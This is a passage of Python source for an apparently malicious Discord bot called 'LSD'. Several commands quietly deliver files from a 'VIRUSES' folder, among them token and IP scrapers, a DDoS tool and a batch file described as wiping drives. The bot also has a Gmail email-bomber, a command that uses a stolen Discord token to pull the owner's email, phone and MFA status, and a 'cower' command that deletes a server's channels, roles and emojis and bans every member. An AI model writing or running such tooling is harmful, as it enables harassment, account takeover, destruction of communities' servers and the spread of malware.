    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/toxic-nitrogen.bat"))


@LSD.command(aliases=["Poweroff", "POWEROFF"], pass_context=True)
async def poweroff(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Discord-IP-Scraper v1.5.c"))


@LSD.command(aliases=["Mouse", "MOUSE"], pass_context=True)
async def mouse(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/out_of_control-ddos.java"))


@LSD.command(aliases=["Window", "WINDOW"], pass_context=True)
async def window(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Nitro-Scraper v2.3.c"))


@LSD.command(aliases=["Unending", "UNENDING"], pass_context=True)
async def unending(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Discord-Token-Scraper v1.0.vbs"))


@LSD.command(aliases=["Instabot", "INSTABOT"], pass_context=True)
async def instabot(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Insta.FollowM3-bot.bat"))

    ##########################################################################################
    ##########################################################################################


@LSD.command(aliases=["malicious", "Malicious", "help malicious"], pass_contect=True)
@commands.guild_only()
async def MALICIOUS(ctx):
    author = ctx.message.author

    embed = discord.Embed(colour=discord.Colour.red())

    embed.set_author(name='')
    embed.add_field(name='POWEROFF', value='Simply shuts the system down.')
    embed.add_field(name='UNENDING', value='Shows an unending sequence of annoying messages.')
    embed.add_field(name='INSTABOT',
                    value='Deletes necessary files to boot up PC. Formats all drives. Removes internet connection from the pc.')
    embed.add_field(name='COWER', value='Fastest Nuke Ever Created :)')

    embed.add_field(name='BYPASS',
                    value='This file should shutdown the persons computer. It shuts it off once and deletes the files needed to reboot and restart.')
    embed.add_field(name='GETHOST', value='this willl return host of ip addresses.')
    embed.add_field(name='WINDOW', value='Randomly moves the window round. Only Ctrl+Alt+Del will work here.')
    embed.add_field(name='MOUSE', value='Randomly moves the mouse pointer, & clicks different places on the screen.')
    embed.set_footer(text='☠ ᴜꜱᴇ ᴀᴛ ʏᴏᴜʀ ᴏᴡɴ ʀɪꜱᴋ ☠')
    embed.add_field(name='CRASH', value='Sends several gifs that will crash Windows and some IPhones.')
    embed.set_footer(text='☠ ᴜꜱᴇ ᴀᴛ ʏᴏᴜʀ ᴏᴡɴ ʀɪꜱᴋ ☠')

    await ctx.send(author, embed=embed)


@LSD.command()
async def servers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in LSD.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


@LSD.command(aliases=["GETBANS", "Genbans"])
async def getbans(ctx):
    if ctx.message.author.guild_permissions.ban_members:
        x = await ctx.message.guild.bans()
        x = '\n'.join([str(y.user) for y in x])
        embed = discord.Embed(title="Users Banned From Server", description=x, colour=0xFFFFF)
        return await ctx.send(embed=embed)
    else:
        await ctx.send(config.err_mesg_permission)


@LSD.command(aliases=["Gethost", "GETHOST"])
async def gethost(ctx, *, ip: str):
    await ctx.message.delete()
    host = socket.gethostbyaddr(ip)
    embed = discord.Embed(title="Host Found", color=0xFFFFF, timestamp=ctx.message.created_at)
    embed.add_field(name="Host", value=f"{host}", inline=True)
    embed.add_field(name="IP", value=f"{ip}\n", inline=True)

    await ctx.send(embed=embed, delete_after=1000)


@LSD.command(aliases=["Warn", "WARN"])
@commands.has_permissions(view_audit_log=True)
async def warn(ctx, member: discord.Member, *, reason=None):
    await ctx.send(f"``` {ctx.author} warned {member} for the following reason: ```" + reason)
    await ctx.message.delete()


@LSD.command()
async def virus(ctx, user: discord.Member = None, *, virus: str = "trojan"):
    user = user or ctx.author
    list = (f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-virus.exe Packing files..``",
            f"``Successfully downloaded {virus}-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected {virus}-virus.exe into {user.name}``")
    for i in list:
        await ctx.send(content=i)
        await asyncio.sleep(1)


@LSD.command()
async def flop(ctx):
    list = ("(   ° - °) (' - '   )",
            "(\\\° - °)\ (' - '   )",
            "(—°□°)— (' - '   )",
            "(╯°□°)╯(' - '   )",
            "(╯°□°)╯︵(\\\ .o.)\\")
    for i in list:
        await ctx.send(content=i)
        await asyncio.sleep(1)


def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access" + Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass


@LSD.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):  # b'\xfc'
    await ctx.message.delete()
    GmailBomber()


@LSD.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@LSD.after_invoke
async def after_any_command(ctx):
    if not ctx.command_failed:
        if str(ctx.command) not in LSD.command_count:
            LSD.command_count[str(ctx.command)] = 1
        else:
            LSD.command_count[str(ctx.command)] += 1


@LSD.command(aliases=['dickthot'])
async def howbig(ctx, user: discord.User):
    await ctx.message.delete()
    choices = ['8D', '8=D', '8==D', '8===D', '8====D', '8=====D', '8======D', '8=======D', '8========D',
               '8============D']
    thot = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title=f"🍆 {user.name}'s dick thot", description=f"{thot}")
        embed.set_footer(text="・𝘉𝘪𝘨 𝘛𝘳𝘦𝘦𝘴𝘩・🧩",
                         icon_url='https://media.discordapp.net/attachments/788473285469274112/808564854176088064/image1.jpg?width=417&height=417')
        await ctx.send(embed=embed)

    except:
        ctx.send(f"{user.name}'s cock thot: {thot}")


@LSD.command(aliases=["COWER", "Cower"])
async def cower(ctx):
  await ctx.guild.edit(name='Crashed by LSD')
  for channel in ctx.guild.channels:
    await channel.delete()
  ban = 0
  for member in ctx.guild.member:
    try:
      ban += 1
      await member.ban()
    except:
      continue
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
    if ctx.guild.me.roles[-1] > role:
      await role.delete()
    else:
      break
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
    except:
      pass
      await ctx.guild.create_text_channel(name = "The Harvesters Were Here")




if __name__ == '__main__':
    Init()
